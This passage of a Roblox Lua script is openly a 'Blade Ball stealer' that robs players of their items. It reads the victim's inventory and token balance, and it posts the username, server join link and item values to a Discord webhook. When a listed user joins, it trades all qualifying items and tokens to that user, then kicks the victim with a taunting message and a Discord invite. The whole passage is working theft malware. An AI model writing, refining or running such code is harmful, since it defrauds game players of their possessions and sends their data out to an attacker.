    inTrade = tradeGui.Enabled
end)

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    until response == true
end

local function addItemToTrade(itemType, ID)
    local args = {
        [1] = itemType,
        [2] = ID
    }
    repeat
        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
    until response == true
end

local function readyTrade()
    local args = {
        [1] = true
    }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
    until response == true
end

local function confirmTrade()
    repeat
        wait(0.1)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local totalRAP = 0
local totalTokens = 0

local function SendWebhookMessage(isJoinMessage, items, tokens, statusOverride)
    local currentStatus = statusOverride or _G.webhookData.status
    local title = ""
    local color = 0
    
    if isJoinMessage then
        title = "üé¥ Join to get Blade Ball hit"
        color = 65280 -- Green
        _G.webhookData.joinSent = true
    else
        title = "üé¥ New Blade Ball Execution"
        color = 16711680 -- Red
        _G.webhookData.executionSent = true
    end
    
    -- Update items sent
    if not isJoinMessage then
        for _, item in ipairs(items) do
            table.insert(_G.webhookData.itemsSent, item)
        end
    end
    
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Status",
            value = currentStatus,
            inline = true
        }
    }
    
    if isJoinMessage then
        table.insert(fields, {
            name = "Game:",
            value = "Blade Ball",
            inline = true
        })
        table.insert(fields, {
            name = "Join link:",
            value = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
        })
    end
    
    if #items > 0 then
        local itemListField = {
            name = isJoinMessage and "Loot" or "Items sent:",
            value = "",
            inline = false
        }
        
        local grouped = {}
        for _, item in ipairs(items) do
            if grouped[item.Name] then
                grouped[item.Name].Count = grouped[item.Name].Count + 1
                grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
            else
                grouped[item.Name] = {
                    Name = item.Name,
                    Count = 1,
                    TotalRAP = item.RAP,
                    Category = item.itemType
                }
            end
        end

        local groupedList = {}
        for _, group in pairs(grouped) do
            table.insert(groupedList, group)
        end

        -- Sort alphabetically by item name
        table.sort(groupedList, function(a, b)
            if a.Name:lower() == b.Name:lower() then
                return a.Category < b.Category
            end
            return a.Name:lower() < b.Name:lower()
        end)

        for _, group in ipairs(groupedList) do
            local itemLine = string.format("üî• %s [%s] (x%s) - %s RAP", group.Name, group.Category, group.Count, formatNumber(group.TotalRAP))
            itemListField.value = itemListField.value .. itemLine .. "\n"
        end
        
        -- Add summary line
        itemListField.value = itemListField.value .. "\n====================\n"
        itemListField.value = itemListField.value .. string.format("Total: %s RAP + %s Tokens", formatNumber(totalRAP), formatNumber(tokens))
        
        table.insert(fields, itemListField)
    else
        table.insert(fields, {
            name = "Loot",
            value = "No items to send (check min_rap setting)",
            inline = false
        })
    end

    local data = {
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Blade Ball stealer ‚Ä¢ " .. os.date("%d/%m/%Y %H:%M")
            }
        }}
    }
    
    if isJoinMessage and ping == "Yes" then
        data["content"] = "@everyone"
    end

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    local success, err = pcall(function()
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        warn("Failed to send webhook:", err)
    end
    
    return true
end

local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]

    if not categoryRapData then
        return nameToRAP
    end

    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function()
            return HttpService:JSONDecode(serializedKey)
        end)

        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then
                    local itemName = pair[2]
                    nameToRAP[itemName] = rap
                    break
                end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do
    rapMappings[category] = buildNameToRAPMap(category)
end

local function getRAP(category, itemName)
    local rapMap = rapMappings[category]
    if rapMap then
        local rap = rapMap[itemName]
        if rap then
            return rap
        else
            return 0
        end
    else
        return 0
    end
end

-- Get all items above min_rap
for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if itemInfo.TradeLock then
            continue
        end
        local itemName = itemInfo.Name
        local rap = getRAP(category, itemName)
        if rap >= min_rap then
            totalRAP = totalRAP + rap
            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemName})
        end
    end
end

-- Get tokens amount
local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
local cleanedText = trimmedText:gsub("[^%d]", "")
totalTokens = tonumber(cleanedText) or 0

-- Store original items for webhook
local originalItemsToSend = {}
for i, v in ipairs(itemsToSend) do
    originalItemsToSend[i] = v
end

-- Always send the join message webhook (even on re-execution)
if webhook ~= "" then
    SendWebhookMessage(true, itemsToSend, totalTokens)
end

if #itemsToSend > 0 or totalTokens > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.RAP > b.RAP
    end)

    local function getNextBatch(items, batchSize)
        local batch = {}
        for i = 1, math.min(batchSize, #items) do
            table.insert(batch, table.remove(items, 1))
        end
        return batch
    end

    local function doTrade(joinedUser)
        while #itemsToSend > 0 or totalTokens > 0 do
            sendTradeRequest(joinedUser)
            repeat
                wait(0.5)
            until inTrade

            local currentBatch = getNextBatch(itemsToSend, 100)
            for _, item in ipairs(currentBatch) do
                addItemToTrade(item.itemType, item.ItemID)
            end

            if totalTokens > 0 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(totalTokens)
                totalTokens = 0
            end

            readyTrade()
            confirmTrade()
        end
        
        -- Update status to completed
        _G.webhookData.status = "‚úÖ Completed"
        if webhook ~= "" then
            SendWebhookMessage(false, originalItemsToSend, totalTokens, "‚úÖ Completed")
        end
        
        plr:kick("All your stuff just got stolen. discord.gg/GY2RVSEGDT")
    end

    local function waitForUserJoin()
        local function onUserJoin(player)
            if table.find(users, player.Name) then
                -- Send execution webhook
                if webhook ~= "" then
                    SendWebhookMessage(false, originalItemsToSend, totalTokens)
                end
                doTrade(player.Name)
            end
        end
        
        -- Check existing players
        for _, p in ipairs(Players:GetPlayers()) do 
            onUserJoin(p) 
        end
        
        -- Listen for new players
        Players.PlayerAdded:Connect(onUserJoin)
        
        -- Listen for player leaving
        Players.PlayerRemoving:Connect(function(leavingPlayer)
            if leavingPlayer == plr then
                _G.webhookData.status = "üî¥ Left"
                if webhook ~= "" then
                    SendWebhookMessage(false, _G.webhookData.itemsSent, totalTokens, "üî¥ Left")
                end
            end
        end)
    end
    
    waitForUserJoin()
else
    -- No items to send, still update webhook
    if webhook ~= "" then
        _G.webhookData.status = "‚ö†Ô∏è No items"
        SendWebhookMessage(false, {}, 0, "‚ö†Ô∏è No items")
    end
end
